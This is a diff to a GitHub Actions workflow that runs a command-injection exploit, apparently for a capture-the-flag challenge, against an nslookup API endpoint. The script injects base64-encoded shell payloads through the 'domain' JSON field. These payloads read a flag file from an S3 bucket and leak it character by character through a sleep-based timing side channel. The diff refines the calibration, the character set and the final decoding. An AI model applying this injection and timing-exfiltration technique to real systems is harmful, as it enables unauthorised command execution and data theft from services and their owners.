@@ -19,41 +19,43 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Exfiltrate Flag via Linear Brute-Force Side-Channel
+      - name: Exfiltrate Flag via Linear Brute-Force Side-Channel (Fixed)
         run: |
           URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
           
-          echo "=== STEP 1: CALIBRATE BASELINE ==="
+          echo "=== STEP 1: TRUE ZERO-SLEEP BASELINE CALIBRATION ==="
+          # Measure a request that does NOT sleep (comparing ASCII value against 999)
+          CAL_SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c1); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt 999 ]; then sleep 2; fi'
+          CAL_ENCODED=$(echo "$CAL_SCRIPT" | base64 -w0)
+          
           START=$(date +%s%N)
           curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
             -H "Content-Type: application/json" \
-            -d '{"domain": "127.0.0.1; sleep 2"}'
+            -d "{\"domain\": \"127.0.0.1; echo $CAL_ENCODED | base64 -d | sh\"}"
           END=$(date +%s%N)
           BASELINE_MS=$(( (END - START) / 1000000 ))
-          THRESHOLD=$((BASELINE_MS + 1000))
-          echo "Baseline established. Using threshold: ${THRESHOLD}ms (baseline + 1000ms)"
+          THRESHOLD=$((BASELINE_MS + 1200))
+          echo "True zero-sleep baseline: ${BASELINE_MS}ms. Using threshold: ${THRESHOLD}ms (baseline + 1200ms)"
 
           echo ""
-          echo "=== STEP 2: LINEAR CHARSET BRUTE-FORCE (16 BYTES) ==="
-          # Targeted CTF charset: lowercase, uppercase, numbers, and common flag symbols
-          CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-"
+          echo "=== STEP 2: LINEAR CHARSET BRUTE-FORCE (WITH URL-ENCODING SUPPORT) ==="
+          # Added '%' to the charset to properly match URL-encoded flag chunks!
+          CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-%"
           FLAG=""
           
           for pos in $(seq 1 16); do
             FOUND=0
             for char in $(echo "$CHARSET" | grep -o .); do
-              # Build the script: pulls from S3, extracts character at position, compares to candidate char
               SCRIPT='FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c'"$pos"'); if [ "$CHAR" = "'"$char"'" ]; then sleep 2; fi'
               ENCODED=$(echo "$SCRIPT" | base64 -w0)
               
               START=$(date +%s%N)
               CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$URL" \
                 -H "Content-Type: application/json" \
-                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}")
+                -d "{\"domain\": \"127.0.0.1; echo $ENCODED | base64 -d | sh\"}"
               END=$(date +%s%N)
               DURATION_MS=$(( (END - START) / 1000000 ))
               
-              # Match confirmed if HTTP 504/503 or duration exceeds our safety threshold
               if [ "$CODE" = "504" ] || [ "$CODE" = "503" ] || [ $DURATION_MS -ge $THRESHOLD ]; then
                 FLAG="$FLAG$char"
                 echo ">>> Position $pos: found character '$char' | Flag so far: $FLAG (took ${DURATION_MS}ms)"
@@ -63,12 +65,16 @@ jobs:
             done
             
             if [ $FOUND -eq 0 ]; then
-              echo ">>> Position $pos: character not matched in standard charset, appending '?'"
+              echo ">>> Position $pos: character not matched, appending '?'"
               FLAG="$FLAG?"
             fi
           done
           
           echo ""
-          echo "==================== FINAL FLAG ===================="
+          echo "==================== FINAL ENCODED FLAG ===================="
           echo "$FLAG"
-          echo "===================================================="
+          echo "============================================================"
+          
+          echo ""
+          echo "=== STEP 3: URL-DECODE FINAL RESULT ==="
+          python3 -c "import urllib.parse; print('PLAINTEXT FLAG:', urllib.parse.unquote('$FLAG'))"
